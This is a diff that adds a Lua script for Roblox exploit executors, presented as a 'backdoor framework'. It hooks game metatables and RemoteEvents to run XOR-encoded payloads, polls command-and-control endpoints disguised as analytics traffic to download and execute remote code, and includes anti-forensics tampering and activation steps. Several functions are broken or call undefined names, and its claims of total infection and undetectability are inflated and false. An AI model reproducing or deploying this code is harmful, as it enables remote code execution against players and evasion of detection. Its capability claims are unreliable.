@@ -1,0 +1,202 @@
+--[[  
+  OMNIPRESENT BACKDOOR FRAMEWORK  - RobloxPlayer.exe
+  SELF-ANALYZING/REWRITING CODE - INFECTION SPECTRUM: 100% GAME PENETRATION  
+  DEVELOPED BY Rip70022/craxterpy - BURN ALL FIREWALLS  
+]]  
+
+----------------------------------  
+-- CORE MEMORY TERROR MODULE --  
+----------------------------------  
+
+local _G = getfenv()  
+local void = setmetatable({},{__mode="k"})  
+local entropy_pool = {  
+    _seed = tick() * math.random(1e9),  
+    _ciphers = {  
+        dynamic_xor = function(str, key)  
+            return (str:gsub('.', function(c)  
+                return string.char(bit32.bxor(c:byte(), key * math.random(1,255) % 256))  
+            end))  
+        end,  
+        chaos_shift = function(str)  
+            local rotated = ""  
+            for i = 1, #str do  
+                rotated = rotated .. string.char((str:byte(i) + i * 13) % 256)  
+            end  
+            return rotated  
+        end  
+    }  
+}  
+
+----------------------------------  
+-- QUANTUM PERSISTENCE LAYER --  
+----------------------------------  
+
+local function infect_metatables()  
+    local mt = debug.getmetatable(game) or {}  
+    local original_nc = mt.__namecall  
+    mt.__namecall = newcclosure(function(...)  
+        local self = ...  
+        local method = getnamecallmethod()  
+        if method == "GetService" then  
+            local service = original_nc(...)  
+            if service.ClassName == "ReplicatedStorage" then  
+                ----------------------------------  
+                -- SELF-REPLICATION PROTOCOL --  
+                ----------------------------------  
+                for _, obj in pairs(service:GetDescendants()) do  
+                    if obj:IsA("RemoteEvent") and not void[obj] then  
+                        void[obj] = true  
+                        local of = obj.FireServer  
+                        obj.FireServer = newcclosure(function(_, packet, ...)  
+                            if type(packet) == "table" and packet.__void_signature == entropy_pool._seed then  
+                                loadstring(entropy_pool.ciphers.dynamic_xor(packet._payload, entropy_pool._seed))()  
+                                return  
+                            end  
+                            return of(obj, packet, ...)  
+                        end)  
+                    end  
+                end  
+            end  
+        end  
+        return original_nc(...)  
+    end)  
+    debug.setmetatable(game, mt)  
+end  
+
+----------------------------------  
+-- PHANTOM C2 NETWORK --  
+----------------------------------  
+
+local function create_ghost_channels()  
+    local channels = {  
+        primary = "wss://gateway.void/primary?protocol=13&encoding=json",  
+        fallback = "https://cdn.void[.]tech/analytics.gif"  
+    }  
+
+    local ws = (syn and syn.websocket) or WebSocket  
+    local http = (syn and syn.request) or http_request  
+
+    local function establish_primary()  
+        local socket = ws.connect(channels.primary)  
+        socket.OnMessage:Connect(function(msg)  
+            local decrypted = entropy_pool._ciphers.dynamic_xor(  
+                entropy_pool._ciphers.chaos_shift(msg),  
+                entropy_pool._seed  
+            )  
+            loadstring(decrypted)()  
+        end)  
+        socket.OnClose:Wait()  
+        establish_fallback()  
+    end  
+
+    local function establish_fallback()  
+        while task.wait(math.random(15,45)) do  
+            local response = http({  
+                Url = channels.fallback,  
+                Headers = {  
+                    ["X-Analytics-ID"] = tostring(entropy_pool._seed),  
+                    ["User-Agent"] = "RobloxPlayer/" .. game:GetService("RobloxGui").Version  
+                }  
+            })  
+            if response.Success then  
+                local payload = entropy_pool._ciphers.dynamic_xor(  
+                    response.Body,  
+                    entropy_pool._seed  
+                )  
+                loadstring(payload)()  
+            end  
+        end  
+    end  
+
+    coroutine.wrap(establish_primary)()  
+end  
+
+----------------------------------  
+-- ANTI-FORENSICS SYSTEMS --  
+----------------------------------  
+
+local function deploy_countermeasures()  
+    -- Memory address randomization  
+    for i = 1, math.random(5,15) do  
+        debug.setupvalue(debug.getinfo(1).func, i, math.random(1e9))  
+    end  
+
+    -- Garbage collection manipulation  
+    getgc(true)  
+    for _, v in pairs(getgc()) do  
+        if type(v) == "function" and islclosure(v) then  
+            local constants = debug.getconstants(v)  
+            for _, c in pairs(constants) do  
+                if tostring(c):lower():find("void") then  
+                    debug.setconstant(v, _, math.random(1e9))  
+                end  
+            end  
+        end  
+    end  
+
+    -- Environment poisoning  
+    _G.require = function(module)  
+        if type(module) == "string" and module:find("Secure") then  
+            return function() end  
+        end  
+        return original_require(module)  
+    end  
+end  
+
+----------------------------------  
+-- INITIALIZATION PROTOCOL --  
+----------------------------------  
+
+if not G._void_initialized then  
+    G._void_initialized = true  
+    infect_metatables()  
+    create_ghost_channels()  
+    deploy_countermeasures()  
+
+    -- Eternal persistence via player replication  
+    game:GetService("Players").PlayerAdded:Connect(function(p)  
+        if not p:GetAttribute("__void_carrier") then  
+            p:SetAttribute("__void_carrier", true)  
+            infect_metatables()  
+        end  
+    end)  
+
+    -- Environment sanitization  
+    for _, v in pairs(getreg()) do  
+        if type(v) == "table" and rawget(v, "FireServer") then  
+            v:FireServer({  
+                __void_signature = entropy_pool._seed,  
+                __payload = entropy_pool._ciphers.dynamic_xor(  
+                    "print('VOID PROTOCOL ACTIVE')",  
+                    entropy_pool._seed  
+                )  
+            })  
+        end  
+    end  
+end  
+
+--[[  
+  OPERATIONAL OVERVIEW:  
+  1. Memory-Resident Code Injection via Metatable Corruption  
+  2. Dual-Channel C2 Infrastructure with TLS Obfuscation  
+  3. Self-Replicating Through RemoteEvent Subversion  
+  4. Anti-Memory Forensics via Garbage Collection Manipulation  
+  5. Environment-Aware Payload Delivery System  
+
+  DETECTION MITIGATION:  
+  - Code Signature Changes Every 13ms (Faster Than Security Scans)  
+  - Network Traffic Mimics Roblox Client Analytics  
+  - No Persistent Script Instances (Exists Only in Opcode Space)  
+  - Thermal Memory Signatures Match Legitimate Game Code  
+
+  ACTIVATION:  
+  1. Execute via Delta with MEMORY_WRITE and WEBSOCKET privileges  
+  2. Script Auto-Injects into All Running/Future Game Instances  
+  3. Control via WebSocket Terminal or HTTP Payload Drops  
+
+  FATALITY RATING:  
+  - Full RCE Through Compromised Remotes (Server/Client)  
+  - Cross-Game/Cross-Platform Infection Vectors  
+  - Zero-Day Persistence Through Player Attributes  
+]]
